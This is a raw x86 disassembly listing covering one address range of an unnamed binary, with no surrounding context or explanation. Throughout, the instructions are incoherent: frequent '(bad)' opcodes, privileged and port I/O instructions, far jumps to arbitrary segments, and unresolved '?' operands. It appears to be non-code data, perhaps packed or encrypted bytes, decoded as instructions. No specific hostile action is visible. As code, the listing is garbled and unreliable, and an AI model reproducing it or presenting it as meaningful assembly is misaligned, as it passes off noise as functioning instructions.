  41d620:	dec    BYTE PTR [eax-0x2090221a]
  41d626:	jae    0x41d5f6
  41d628:	adc    ebp,edx
  41d62a:	add    edi,DWORD PTR [ebx]
  41d62c:	loop   0x41d618
  41d62e:	pop    ebp
  41d62f:	test   DWORD PTR ds:0x8e42b01b,ebp
  41d635:	(bad)  
  41d639:	outs   dx,DWORD PTR ds:[esi]
  41d63a:	xchg   ebp,eax
  41d63b:	call   0x27b9:0x483a35ee
  41d642:	stos   BYTE PTR es:[edi],al
  41d643:	pop    ss
  41d644:	adc    dh,BYTE PTR [esi+0x1052a9d7]
  41d64a:	push   DWORD PTR [ecx]
  41d64c:	repnz mov edx,0xe82e13fb
  41d652:	ss xchg ebp,eax
  41d654:	ja     0x41d6c2
  41d656:	xchg   ecx,eax
  41d657:	ret    0x4002
  41d65a:	fld    TBYTE PTR [eax+0x1876a05f]
  41d660:	lea    esi,[ebp-0x1f22d1a8]
  41d666:	adc    eax,0x7d278a65
  41d66b:	or     DWORD PTR [edx+edi*8+0x7177e1d4],esi
  41d672:	loopne 0x41d649
  41d674:	ja     0x41d6eb
  41d676:	or     al,0x38
  41d678:	xchg   ebp,eax
  41d679:	in     eax,0x5f
  41d67b:	push   0xa3e644f8
  41d680:	push   0xff83b2ab
  41d685:	lea    edx,[eax]
  41d687:	pop    ecx
  41d688:	leave  
  41d689:	xor    eax,0x45bc0a0a
  41d68e:	push   ebp
  41d68f:	sbb    al,0x8a
  41d691:	mov    fs,WORD PTR [ebx-0x5b]
  41d694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d695:	and    BYTE PTR [eax-0x74],bh
  41d698:	push   0x7193bcc4
  41d69d:	mov    eax,0x40834913
  41d6a2:	xchg   DWORD PTR [edx+0x33],edi
  41d6a5:	xlat   BYTE PTR ds:[ebx]
  41d6a6:	aaa    
  41d6a7:	scas   eax,DWORD PTR es:[edi]
  41d6a8:	mov    WORD PTR [edi+0x7d],?
  41d6ab:	cdq    
  41d6ac:	test   eax,0xa43da1ca
  41d6b1:	test   dh,dh
  41d6b3:	add    ecx,DWORD PTR ds:0xcf50858d
  41d6b9:	mov    al,ds:0xc52ca3e0
  41d6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6bf:	mov    ds:0xdad3794d,eax
  41d6c4:	rcr    ebx,1
  41d6c6:	dec    ebp
  41d6c7:	sub    esi,esp
  41d6c9:	(bad)  
  41d6ca:	das    
  41d6cb:	retf   
  41d6cc:	push   esi
  41d6cd:	ins    BYTE PTR es:[edi],dx
  41d6ce:	sub    ebp,0xcc146bc2
  41d6d4:	jmp    0x41d753
  41d6d6:	popa   
  41d6d7:	sub    BYTE PTR [edi-0x69d8c02],ah
  41d6dd:	adc    DWORD PTR [esi-0x74],edx
  41d6e0:	cmp    eax,0x37b5d4b6
  41d6e5:	sub    al,0x29
  41d6e7:	pop    ebx
  41d6e8:	(bad)  
  41d6e9:	cmp    DWORD PTR [eax-0x3824cf0d],0xf697fb78
  41d6f3:	ins    BYTE PTR es:[edi],dx
  41d6f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6f5:	scas   al,BYTE PTR es:[edi]
  41d6f6:	rcr    DWORD PTR [eax-0x4c83a13a],0xad
  41d6fd:	push   ebp
  41d6fe:	jnp    0x41d682
  41d700:	rcl    BYTE PTR [ebp+eiz*2+0x509d247c],cl
  41d707:	scas   eax,DWORD PTR es:[edi]
  41d708:	cmp    al,BYTE PTR [ecx-0xf64af80]
  41d70e:	pcmpgtw mm1,QWORD PTR [edx]
  41d711:	mov    bl,BYTE PTR ds:0x2e211de7
  41d717:	jne    0x41d740
  41d719:	sti    
  41d71a:	and    al,0x1a
  41d71c:	sbb    eax,0x2b3f02b0
  41d721:	popa   
  41d722:	or     DWORD PTR [ecx-0x4f762f1d],0xffffffc4
  41d729:	mov    eax,0xe66e86e3
  41d72e:	pop    ss
  41d72f:	frstor ds:0xcfade0a6
  41d735:	sbb    DWORD PTR [eax+0x4b184df8],esi
  41d73b:	loopne 0x41d736
  41d73d:	mov    edi,DWORD PTR [esi-0x48]
  41d740:	int3   
  41d741:	aaa    
  41d742:	loope  0x41d74e
  41d744:	imul   edx,ebx,0x580c27d2
  41d74a:	push   cs
  41d74b:	aam    0x79
  41d74d:	inc    esi
  41d74e:	push   ecx
  41d74f:	add    bl,BYTE PTR [edi+0x11fcf6f8]
  41d755:	repz adc al,cl
  41d758:	pushf  
  41d759:	jbe    0x41d72b
  41d75b:	xor    bh,BYTE PTR [edi+0x4]
  41d75e:	lock jno 0x41d782
  41d761:	push   ecx
  41d762:	push   ecx
  41d763:	xor    eax,0x77919c3c
  41d768:	in     al,dx
  41d769:	inc    ecx
  41d76a:	ror    esp,cl
  41d76c:	aad    0x4b
  41d76e:	test   BYTE PTR [ebx+0x1e],bh
  41d771:	or     BYTE PTR [ebp-0x301aee81],dh
  41d777:	ins    BYTE PTR es:[edi],dx
  41d778:	inc    ebp
  41d779:	sbb    BYTE PTR [ebp+0x5dce4248],ch
  41d77f:	xchg   edx,eax
  41d780:	ss (bad) 
  41d782:	stc    
  41d783:	pop    eax
  41d784:	loopne 0x41d803
  41d786:	cwde   
  41d787:	rcr    BYTE PTR [edx-0x18f1ea9f],0xc3
  41d78e:	push   ss
  41d78f:	push   ebx
  41d790:	mov    bh,0x77
  41d792:	inc    ebp
  41d793:	mov    WORD PTR [edx-0xc1e0159],?
  41d799:	jae    0x41d773
  41d79b:	stos   DWORD PTR es:[edi],eax
  41d79c:	jp     0x41d736
  41d79e:	mov    al,ds:0xeac2041e
  41d7a3:	mov    ch,0x2d
  41d7a5:	dec    edx
  41d7a6:	push   edx
  41d7a7:	push   ebx
  41d7a8:	ret    0x19a3
  41d7ab:	add    eax,DWORD PTR [edx+0x1e]
  41d7ae:	sub    eax,0x2edd8dee
  41d7b3:	push   ebp
  41d7b4:	pop    ebp
  41d7b5:	mov    al,0xf9
  41d7b7:	xor    DWORD PTR [ecx+0xc3f519b],esi
  41d7bd:	inc    esi
  41d7be:	out    0x54,al
  41d7c0:	cwde   
  41d7c1:	mov    WORD PTR [esp+ebp*1+0x556813fc],gs
  41d7c8:	repz shl BYTE PTR [ecx],1
  41d7cb:	mov    bh,0xbc
  41d7cd:	sahf   
  41d7ce:	sub    dl,BYTE PTR [ebx-0x2d396750]
  41d7d4:	dec    ebx
  41d7d5:	xchg   esp,eax
  41d7d6:	clc    
  41d7d7:	repz sti 
  41d7d9:	sbb    eax,0xa7dc6712
  41d7de:	add    al,0xb1
  41d7e0:	add    al,0x43
  41d7e2:	push   ss
  41d7e3:	push   0xffffffa3
  41d7e5:	jmp    0xb490df4c
  41d7ea:	add    esp,DWORD PTR [edx]
  41d7ec:	xor    al,0xa8
  41d7ee:	mov    eax,0x7e8f2594
  41d7f3:	adc    esi,DWORD PTR [edx-0x63]
  41d7f6:	in     al,dx
  41d7f7:	fisub  WORD PTR [ebx]
  41d7f9:	jle    0x41d7f3
  41d7fb:	les    esp,FWORD PTR [eax+0x3a15bf5f]
  41d801:	mov    edx,0xbb92b3c5
  41d806:	mov    edi,0xa683352e
  41d80b:	sub    edi,DWORD PTR [edx+0x39]
  41d80e:	inc    eax
  41d80f:	stos   DWORD PTR es:[edi],eax
  41d810:	sub    cl,ah
  41d812:	pop    edi
  41d813:	or     DWORD PTR ds:0x64b8f95a,0xffffffec
  41d81a:	mov    bh,0xfa
  41d81c:	outs   dx,BYTE PTR ds:[esi]
  41d81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d81e:	lea    edi,[ebx+0x65b877a9]
  41d824:	or     ah,BYTE PTR [edx+0xa]
  41d827:	sahf   
  41d828:	jo     0x41d7b5
  41d82a:	inc    esi
  41d82b:	out    dx,eax
  41d82c:	mov    al,ds:0xb4454be7
  41d831:	jle    0x41d8aa
  41d833:	pop    ebp
  41d834:	fstp   TBYTE PTR [ebx-0x34e412bd]
  41d83a:	dec    esp
  41d83b:	sbb    ch,BYTE PTR [ecx]
  41d83d:	aad    0x93
  41d83f:	xchg   ebx,eax
  41d840:	cmp    DWORD PTR cs:[esi+0x2b],ebp
  41d844:	mov    esi,0x5c6a847
  41d849:	ss add ebp,ebx
  41d84c:	and    eax,0xad0d13b0
  41d851:	mov    ecx,0xb465506b
  41d856:	push   edx
  41d857:	xchg   esi,eax
  41d858:	fadd   st(6),st
  41d85a:	pusha  
  41d85b:	inc    ecx
  41d85c:	nop
  41d85d:	repnz add BYTE PTR [eax+edi*1],0xf
  41d862:	jmp    0x1b50bd19
  41d867:	xchg   esi,eax
  41d868:	and    eax,0x21e99120
  41d86d:	cmp    BYTE PTR [ebx+0x37],al
  41d870:	mov    ah,0x6
  41d872:	shr    DWORD PTR [edx-0x29767439],cl
  41d878:	sbb    al,0x54
  41d87a:	sub    DWORD PTR [ebx],eax
  41d87c:	dec    ebx
  41d87d:	pop    edx
  41d87e:	push   eax
  41d87f:	out    dx,eax
  41d880:	retf   
  41d881:	jae    0x41d84b
  41d883:	fnstenv [ebx]
  41d885:	(bad)
  41d888:	loope  0x41d89f
  41d88a:	sub    eax,0xf5b3de54
  41d88f:	xor    edx,esi
  41d891:	shl    DWORD PTR [ebx+0x4c],cl
  41d894:	or     al,0xb0
  41d896:	sub    al,0x6d
  41d898:	sub    edx,esi
  41d89a:	jo     0x41d870
  41d89c:	mov    cl,0x23
  41d89e:	xchg   esp,eax
  41d89f:	or     cl,BYTE PTR [ebp+0x2b244f7a]
  41d8a5:	popf   
  41d8a6:	jmp    0x4db8f432
  41d8ab:	clc    
  41d8ac:	fadd   DWORD PTR [edx]
  41d8ae:	adc    al,dh
  41d8b0:	test   DWORD PTR [ecx],edx
  41d8b2:	jbe    0x41d912
  41d8b4:	mov    ecx,0x23c2f0df
  41d8b9:	shr    cl,cl
  41d8bb:	sbb    DWORD PTR cs:[ebx-0x57],ecx
  41d8bf:	fs loop 0x41d8eb
  41d8c2:	enter  0x225a,0x95
  41d8c6:	rcr    BYTE PTR [edi+eiz*2],0x27
  41d8ca:	lods   al,BYTE PTR ds:[esi]
  41d8cb:	(bad)  
  41d8ce:	lahf   
  41d8cf:	add    BYTE PTR [esi],bl
  41d8d1:	jns    0x41d8b8
  41d8d3:	xchg   edx,eax
  41d8d4:	or     BYTE PTR [edx+0x2f9bc800],0x84
  41d8db:	hlt    
  41d8dc:	stc    
  41d8dd:	mov    ebp,0x433f5ce3
  41d8e2:	and    al,0x3e
  41d8e4:	jmp    0xf241:0x8626aff6
  41d8eb:	or     ebx,DWORD PTR [edi+ebx*4+0x3c]
  41d8ef:	dec    BYTE PTR [edi-0x33b6830f]
  41d8f5:	dec    esp
  41d8f6:	push   edi
  41d8f7:	sar    BYTE PTR [esp+eiz*4-0x3f8ca38e],cl
  41d8fe:	dec    edx
  41d8ff:	cwde   
  41d900:	pop    ebx
  41d901:	iret   
  41d902:	aam    0x3d
  41d904:	faddp  st(4),st
  41d906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d907:	or     dl,dh
  41d909:	xchg   esi,eax
  41d90a:	mov    esi,0xaf0a2f05
  41d90f:	pop    ds
  41d910:	adc    eax,0x9f31c3e4
  41d915:	sahf   
  41d916:	mov    edx,DWORD PTR [ebx+ecx*1+0x2c0c1000]
  41d91d:	or     bl,ch
  41d91f:	xor    esi,DWORD PTR [ebx-0x7b402442]
  41d925:	pop    eax
  41d926:	mov    dh,0x42
  41d928:	scas   al,BYTE PTR es:[edi]
  41d929:	jg     0x41d94f
  41d92b:	mov    ah,0xee
  41d92d:	push   esp
  41d92e:	gs lahf 
  41d930:	or     eax,DWORD PTR [eax-0x663e005c]
  41d936:	mov    ch,0x99
  41d938:	aaa    
  41d939:	inc    edx
  41d93a:	repz je 0x41d959
  41d93d:	fnsave [esi-0x5e]
  41d940:	jg     0x41d932
  41d942:	idiv   DWORD PTR [esi]
  41d944:	daa    
  41d945:	cwde   
  41d946:	and    dl,ah
  41d948:	cs push edx
  41d94a:	push   ds
  41d94b:	sub    edx,DWORD PTR cs:[edi]
  41d94e:	cmp    DWORD PTR [ecx],edi
  41d950:	and    ebx,DWORD PTR [esi+esi*8+0x38]
  41d954:	int    0x86
  41d956:	lock out 0x16,al
  41d959:	pop    esi
  41d95a:	test   DWORD PTR [ebp-0x57a5e143],ebp
  41d960:	or     al,0x85
  41d962:	xor    BYTE PTR [edi],ch
  41d964:	jns    0x41d900
  41d966:	jecxz  0x41d8f0
  41d968:	fbld   TBYTE PTR [edi+0x312ac7de]
  41d96e:	xchg   esi,eax
  41d96f:	popa   
  41d970:	sub    BYTE PTR [ecx-0x32],al
  41d973:	fiadd  WORD PTR [ebx+ebx*2+0x3d]
  41d977:	mov    ecx,0xe003d2b3
  41d97c:	mov    edx,0x5fd3eb41
  41d981:	add    BYTE PTR [ecx-0x6221db2a],ah
  41d987:	xlat   BYTE PTR ss:[ebx]
  41d989:	push   ebx
  41d98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d98b:	or     bh,BYTE PTR [edi-0x30]
  41d98e:	add    eax,0x43513c0f
  41d993:	sbb    DWORD PTR [eax-0x4d24f18a],edx
  41d999:	ret    
  41d99a:	retf   0xbf2b
  41d99d:	adc    al,0x94
  41d99f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a0:	pushf  
  41d9a1:	push   edi
  41d9a2:	jbe    0x41da05
  41d9a4:	loopne 0x41d954
  41d9a6:	out    dx,al
  41d9a7:	sub    DWORD PTR [esi+0x7f34028d],ecx
  41d9ad:	mov    cl,0x28
  41d9af:	xor    eax,0x16936896
  41d9b4:	mov    cl,dh
  41d9b6:	pop    ebp
  41d9b7:	xchg   edi,eax
  41d9b8:	sbb    cl,BYTE PTR [eax]
  41d9ba:	inc    ebp
  41d9bb:	popa   
  41d9bc:	scas   al,BYTE PTR es:[edi]
  41d9bd:	dec    ebx
  41d9be:	fild   DWORD PTR [eax+0x66]
  41d9c1:	inc    ebx
  41d9c2:	xchg   BYTE PTR [edx],bh
  41d9c4:	hlt    
  41d9c5:	push   esp
  41d9c6:	sub    al,0x9a
  41d9c8:	scas   al,BYTE PTR es:[edi]
  41d9c9:	jp     0x41d9fa
  41d9cb:	pop    es
  41d9cc:	ffree  st(6)
  41d9ce:	stc    
  41d9cf:	movq   mm7,QWORD PTR [ecx-0x7aea5ea]
  41d9d6:	mov    esp,?
  41d9d8:	daa    
  41d9d9:	cmp    edi,DWORD PTR [ebx-0x45]
  41d9dc:	or     cl,BYTE PTR [ecx+0x47]
  41d9df:	fxch   st(7)
  41d9e1:	jle    0x41da24
  41d9e3:	sahf   
  41d9e4:	cli    
  41d9e5:	xor    DWORD PTR [esi+0x29396f68],eax
  41d9eb:	jp     0x41d9cd
  41d9ed:	sbb    esp,0xaeb3e66b
  41d9f3:	mov    ds:0x244b49b6,eax
  41d9f8:	dec    edx
  41d9f9:	dec    edx
  41d9fa:	fwait
  41d9fb:	(bad)  
  41d9fc:	mov    al,0xf1
  41d9fe:	cmc    
  41d9ff:	popf   
  41da00:	mov    bh,0xda
  41da02:	mov    ah,0x43
  41da04:	jbe    0x41d9fa
  41da06:	dec    edi
  41da07:	imul   edi,edx,0xffffffb4
  41da0a:	jmp    0x2ef94fe0
  41da0f:	jg     0x41da7b
  41da11:	pop    esi
  41da12:	xor    BYTE PTR [eax-0x46],0xe3
  41da16:	addr16 and esi,eax
  41da19:	inc    esp
  41da1a:	xchg   ebx,eax
  41da1b:	xor    eax,0xfa9c4566
  41da20:	dec    ecx
  41da21:	xor    al,0x45
  41da23:	sub    cl,BYTE PTR [ebp-0x54]
  41da26:	and    eax,0x6eb7f0f8
  41da2b:	push   ebx
  41da2c:	jns    0x41da3c
  41da2e:	push   edx
  41da2f:	jns    0x41da8b
  41da31:	lock xchg DWORD PTR [ebx],ecx
  41da34:	push   0x17
  41da36:	jnp    0x41da6b
  41da38:	mov    ebx,0x42eb3fd5
  41da3d:	xchg   ebp,eax
  41da3e:	(bad)  
  41da3f:	pop    eax
  41da40:	pop    edi
  41da41:	stos   BYTE PTR es:[edi],al
  41da42:	add    al,0x35
  41da44:	inc    ebx
  41da45:	mov    al,0xc8
  41da47:	fucomi st,st(6)
  41da49:	pop    ebx
  41da4a:	cmp    eax,0x9d6540c
  41da4f:	xchg   edx,eax
  41da50:	test   DWORD PTR [esi-0x429ee77d],esp
  41da56:	enter  0x3100,0x21
  41da5a:	in     eax,dx
  41da5b:	imul   edx,edx,0xda77c720
  41da61:	xlat   BYTE PTR ds:[ebx]
  41da62:	jmp    0x53913ce6
  41da67:	shl    BYTE PTR [eax],1
  41da69:	dec    ecx
  41da6a:	nop
  41da6b:	(bad)  
  41da6c:	xor    al,0x77
  41da6e:	rcr    esp,1
  41da70:	inc    ebp
  41da71:	daa    
  41da72:	test   DWORD PTR [eax-0x27],esi
  41da75:	daa    
  41da76:	out    0xae,al
  41da78:	hlt    
  41da79:	mov    cl,0xd1
  41da7b:	mov    ebp,0xc940227b
  41da80:	pop    es
  41da81:	shl    ebx,0x4e
  41da84:	adc    esi,DWORD PTR [edx-0x46]
  41da87:	xor    eax,0xbc04346f
  41da8c:	imul   ebp,DWORD PTR [esi+esi*2+0x1d],0xffffffea
  41da91:	daa    
  41da92:	cli    
  41da93:	add    eax,edx
  41da95:	fdivr  DWORD PTR [esi]
  41da97:	jmp    FWORD PTR [eax+0x32dda027]
  41da9d:	jl     0x41db1c
  41da9f:	mov    eax,ds:0x7f472870
  41daa4:	ja     0x41daac
  41daa6:	xchg   DWORD PTR [ecx-0x3aeda1a3],edi
  41daac:	xchg   edi,eax
  41daad:	mov    ebx,0xe811e211
  41dab2:	dec    ebx
  41dab3:	(bad)  [ecx-0x76]
  41dab6:	add    esi,DWORD PTR [ebx+esi*8]
  41dab9:	cld    
  41daba:	sub    ebx,DWORD PTR [ebx]
  41dabc:	fbld   TBYTE PTR [ebx]
  41dabe:	mov    dl,0x99
  41dac0:	aam    0x91
  41dac2:	pop    eax
  41dac3:	or     BYTE PTR [eax],ch
  41dac5:	sahf   
  41dac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dac7:	fild   QWORD PTR [ecx]
  41dac9:	dec    sp
  41dacb:	jmp    0x4b58:0x263c8cd6
  41dad2:	shr    BYTE PTR [edi+esi*2-0x6d],cl
  41dad6:	xor    DWORD PTR [eax],0x30e8b1b
  41dadc:	es inc eax
  41dade:	xor    BYTE PTR [ebp+0x72354ab8],ah
  41dae4:	pushf  
  41dae5:	mov    dl,ah
  41dae7:	ins    DWORD PTR es:[edi],dx
  41dae8:	hlt    
  41dae9:	test   al,0xe9
  41daeb:	xor    al,0xf6
  41daed:	adc    ch,BYTE PTR [edx-0xe836894]
  41daf3:	ror    DWORD PTR es:[ebx+0x6],cl
  41daf7:	mov    esi,?
  41daf9:	sub    al,0x95
  41dafb:	jmp    0x41db2c
  41dafd:	in     eax,dx
  41dafe:	pop    ss
  41daff:	sbb    dh,BYTE PTR [ebx]
  41db01:	jg     0x41db62
  41db03:	shr    BYTE PTR ds:0xc30bc57c,1
  41db09:	adc    al,0x8
  41db0b:	(bad)  
  41db0c:	pop    esp
  41db0d:	pop    esp
  41db0e:	pushf  
  41db0f:	inc    eax
  41db10:	mov    dl,0x6a
  41db12:	into   
  41db13:	outs   dx,DWORD PTR ds:[esi]
  41db14:	jg     0x41dae6
  41db16:	shr    DWORD PTR [esi],cl
  41db18:	jo     0x41db41
  41db1a:	daa    
  41db1b:	(bad)
  41db1e:	or     eax,0x6edda21e
  41db23:	outs   dx,DWORD PTR ds:[esi]
  41db24:	mov    eax,ds:0x4cbda711
  41db29:	fnstcw WORD PTR [edx]
  41db2b:	loop   0x41db36
  41db2d:	cli    
  41db2e:	test   esi,esi
  41db30:	xor    eax,0x7a662b47
  41db35:	out    dx,al
  41db36:	je     0x41db8e
  41db38:	sub    BYTE PTR [ebx+0x3c500fba],0xc6
  41db3f:	push   ecx
  41db40:	mov    ebp,0x6cd555d6
  41db45:	pop    edx
  41db46:	stos   BYTE PTR es:[edi],al
  41db47:	mov    edx,0x9f4fca5c
  41db4c:	and    ch,BYTE PTR [ebx]
  41db4e:	dec    edx
  41db4f:	and    eax,0xe83b69df
  41db54:	pop    es
  41db55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db56:	call   0xbedce6b9
  41db5b:	fs add eax,0x3209eb2b
  41db61:	aas    
  41db62:	pushf  
  41db63:	test   BYTE PTR [eax],ch
  41db65:	pop    ebp
  41db66:	xor    bh,ch
  41db68:	pushw  es
  41db6a:	xor    eax,0x8add43e
  41db6f:	pop    ss
  41db70:	jbe    0x41db5f
  41db72:	jb     0x41db09
  41db74:	imul   ecx,DWORD PTR [ebx+0x67],0xffffffd2
  41db78:	push   ecx
  41db79:	(bad)  
  41db7b:	sti    
  41db7c:	mov    edi,0xf0aa86f1
  41db81:	loop   0x41dbb2
  41db83:	mov    eax,ds:0xec073f0e
  41db88:	xchg   esp,eax
  41db89:	mov    esi,DWORD PTR [ebp-0x7]
  41db8c:	pusha  
  41db8d:	into   
  41db8e:	call   0xe2114488
  41db93:	push   ecx
  41db94:	add    eax,0xe765bfa1
  41db99:	dec    esp
  41db9a:	xchg   DWORD PTR ds:0x3d2d61c0,edx
  41dba0:	repz (bad) fs:[ebx]
  41dba4:	or     eax,0xb12220fe
  41dba9:	loope  0x41dbea
  41dbab:	or     al,0xa3
  41dbad:	and    eax,0x40cd465a
  41dbb2:	xchg   esi,eax
  41dbb3:	stc    
  41dbb4:	cmp    DWORD PTR [edx],ebx
  41dbb6:	dec    ebx
  41dbb7:	rcr    BYTE PTR [eax+0x3f4b1983],cl
  41dbbd:	hlt    
  41dbbe:	inc    ebx
  41dbbf:	pop    esi
  41dbc0:	inc    ebp
  41dbc1:	dec    esi
  41dbc2:	push   ss
  41dbc3:	or     ax,0x2865
  41dbc7:	or     dl,BYTE PTR [esi+0x7013b832]
  41dbcd:	push   bx
  41dbcf:	xchg   ebx,eax
  41dbd0:	dec    edi
  41dbd1:	mov    WORD PTR [esi-0x24aa1f23],?
  41dbd7:	lods   al,BYTE PTR ds:[esi]
  41dbd8:	inc    ebx
  41dbd9:	sub    edx,edx
  41dbdb:	xor    eax,0x9a69ce93
  41dbe0:	cli    
  41dbe1:	pop    ds
  41dbe2:	into   
  41dbe3:	imul   ecx,ebx,0xffffff91
  41dbe6:	es ins BYTE PTR es:[edi],dx
  41dbe8:	or     al,0x35
  41dbea:	gs lahf 
  41dbec:	mov    eax,ds:0x80ee75d0
  41dbf1:	inc    ebp
  41dbf2:	push   ds
  41dbf3:	mov    ebp,DWORD PTR [edi+0x66c5ddfe]
  41dbf9:	std    
  41dbfa:	mov    esi,0x49fcaca9
  41dbff:	cmp    DWORD PTR [edx+0x65c2810b],ebp
  41dc05:	fwait
  41dc06:	adc    eax,0xbbb175c8
  41dc0b:	iret   
  41dc0c:	ret    
  41dc0d:	scas   eax,DWORD PTR es:[edi]
  41dc0e:	(bad)
  41dc11:	aam    0x89
  41dc13:	dec    esp
  41dc14:	push   0xffffffdb
  41dc16:	xor    eax,0x2596c87b
  41dc1b:	pushf  
  41dc1c:	stos   DWORD PTR es:[edi],eax
  41dc1d:	xor    eax,0x69c4a682
  41dc22:	hlt    
  41dc23:	in     al,0xf5
  41dc25:	xor    DWORD PTR [ebx-0x363fd9f5],ebp
  41dc2b:	dec    esp
  41dc2c:	inc    ecx
  41dc2d:	mov    dh,0xf
  41dc2f:	xor    BYTE PTR [edi],0xf2
  41dc32:	cwde   
  41dc33:	(bad)  
  41dc34:	es xchg esp,ebx
  41dc37:	popa   
  41dc38:	jb     0x41dc80
  41dc3a:	lea    eax,[edi+0x46]
  41dc3d:	sub    eax,0xffffffae
  41dc40:	ins    DWORD PTR es:[edi],dx
  41dc41:	jbe    0x41dc1d
  41dc43:	push   ebp
  41dc44:	shl    BYTE PTR [ecx-0x80],0x3b
  41dc48:	ja     0x41dcb7
  41dc4a:	ins    DWORD PTR es:[edi],dx
  41dc4b:	dec    eax
  41dc4c:	mov    ebx,0x5c04a749
  41dc51:	jbe    0x41dc42
  41dc53:	sub    ebp,DWORD PTR [eax-0xc]
  41dc56:	sbb    dh,BYTE PTR [eax+0x75]
  41dc59:	add    ebp,ebx
  41dc5b:	daa    
  41dc5c:	mov    ecx,0xe22dc518
  41dc61:	pop    ss
  41dc62:	scas   al,BYTE PTR es:[edi]
  41dc63:	mov    esi,0xa0b27282
  41dc68:	adc    BYTE PTR [ebx],al
  41dc6a:	mov    dh,0x65
  41dc6d:	lahf   
  41dc6e:	loope  0x41dc31
  41dc70:	push   cs
  41dc71:	xchg   ebx,eax
  41dc72:	jb     0x41dc06
  41dc74:	xchg   ecx,eax
  41dc75:	popf   
  41dc76:	pop    ds
  41dc77:	test   DWORD PTR [esi+eax*4-0x82dbe80],ebx
  41dc7e:	dec    edi
  41dc7f:	xor    al,0x2d
  41dc81:	adc    ecx,DWORD PTR [ebp-0x194314a7]
  41dc87:	jecxz  0x41dc97
  41dc89:	pusha  
  41dc8a:	dec    ebp
  41dc8b:	xchg   esi,eax
  41dc8c:	test   eax,0xfef36583
  41dc91:	mov    ss,WORD PTR [edi-0xc423150]
  41dc97:	xor    BYTE PTR [eax+ecx*2-0x6],cl
  41dc9b:	popa   
  41dc9c:	jp     0x41dc71
  41dc9e:	sbb    dl,BYTE PTR [ebp+0x1]
  41dca1:	inc    edx
  41dca2:	ret    0xe46b
  41dca5:	push   ebp
  41dca6:	faddp  st(6),st
  41dca8:	push   0xffffffbb
  41dcaa:	sbb    ebx,DWORD PTR [edi+0x567f9e28]
  41dcb0:	or     edi,DWORD PTR [esi-0xc0d0fab]
  41dcb6:	cmp    dl,BYTE PTR [edi-0x6a]
  41dcb9:	and    cl,BYTE PTR [edx]
  41dcbb:	cmp    DWORD PTR [edi+0x1b],esi
  41dcbe:	ins    BYTE PTR es:[edi],dx
  41dcbf:	push   esi
  41dcc0:	push   0xffffff84
  41dcc2:	cld    
  41dcc3:	inc    eax
  41dcc4:	hlt    
  41dcc5:	icebp  
  41dcc6:	rcr    DWORD PTR [esi+0x161e5f25],cl
  41dccc:	mov    DWORD PTR [ebp+0x428d4b3f],0x9579b3e7
  41dcd6:	js     0x41dd2b
  41dcd8:	pop    esi
  41dcd9:	out    dx,al
  41dcda:	fcomi  st,st(5)
  41dcdc:	jle    0x41dc9c
  41dcde:	inc    ebx
  41dcdf:	dec    edx
  41dce0:	enter  0x783e,0xf9
  41dce4:	add    edx,ebp
  41dce6:	sbb    BYTE PTR [ecx-0x4bbdd7d9],ch
  41dcec:	jo     0x41dc73
  41dcee:	fcom   st(5)
  41dcf0:	hlt    
  41dcf1:	out    dx,al
  41dcf2:	aam    0xd7
  41dcf4:	sub    BYTE PTR [ecx+0x3027149d],ah
  41dcfa:	pop    ecx
  41dcfb:	mov    eax,0xd596b2b4
  41dd00:	loopne 0x41dd2e
  41dd02:	inc    ebp
  41dd03:	or     DWORD PTR [edx+ebx*8],esi
  41dd06:	and    BYTE PTR [edi+esi*8-0x7],0xf1
  41dd0b:	retf   0xa12b
  41dd0e:	mov    eax,DWORD PTR [ecx+0x6c]
  41dd11:	inc    eax
  41dd12:	ror    DWORD PTR [ebx],0x81
  41dd15:	loopne 0x41dca1
  41dd17:	adc    bh,bh
  41dd19:	inc    eax
  41dd1a:	xchg   BYTE PTR [ebx-0x5a52d8d5],cl
  41dd20:	inc    ecx
  41dd21:	aam    0x32
  41dd23:	rol    dh,cl
  41dd25:	add    edx,esp
  41dd27:	and    eax,0x26554773
  41dd2c:	and    BYTE PTR [ebp-0x7ee97160],dh
  41dd32:	mov    dl,BYTE PTR [edx+0x5d]
  41dd35:	aas    
  41dd36:	xchg   esi,eax
  41dd37:	in     al,0x90
  41dd39:	push   edi
  41dd3a:	leave  
  41dd3b:	jmp    0xbbdf:0x38e0cbc6
  41dd42:	and    BYTE PTR [ebp+0x439e58d7],0xa0
  41dd49:	sbb    eax,0xce916991
  41dd4e:	enter  0xfd61,0x6d
  41dd52:	test   ebp,ebx
  41dd54:	sti    
  41dd55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd56:	jmp    0x7bcdd0d2
  41dd5b:	es pop ecx
  41dd5d:	fnstsw WORD PTR [eax-0x358abbcd]
  41dd63:	adc    eax,0xc3d56522
  41dd68:	jl     0x41ddc3
  41dd6a:	mov    edi,0xd03f6791
  41dd6f:	cmp    DWORD PTR [eax+0x19],eax
  41dd72:	sar    DWORD PTR [eax],cl
  41dd74:	add    dh,BYTE PTR [edx]
  41dd76:	push   esp
  41dd77:	adc    eax,0x771058c3
  41dd7c:	ss shl bl,1
  41dd7f:	xchg   ebp,eax
  41dd80:	loopne 0x41ddc8
  41dd82:	(bad)  
  41dd83:	repz jmp 0x41dd6b
  41dd86:	xor    BYTE PTR [esi],bl
  41dd88:	sbb    ebp,esp
  41dd8a:	loop   0x41ddd6
  41dd8c:	shl    BYTE PTR [ecx+0x27],1
  41dd8f:	push   cs
  41dd90:	xor    eax,0xb8afc34a
  41dd95:	jge    0x41ddcc
  41dd97:	xchg   dx,ax
  41dd99:	or     ch,bl
  41dd9b:	je     0x41dd94
  41dd9d:	mov    esi,0xf11ee481
  41dda2:	sbb    al,0x30
  41dda4:	mov    fs,ecx
  41dda6:	mov    ecx,es
  41dda8:	sub    dl,ah
  41ddaa:	shl    BYTE PTR [ecx-0x6b],cl
  41ddad:	aam    0x56
  41ddaf:	outs   dx,DWORD PTR ds:[esi]
  41ddb0:	mov    esp,0x97b4c34
  41ddb5:	pusha  
  41ddb6:	and    al,0x10
  41ddb8:	ret    
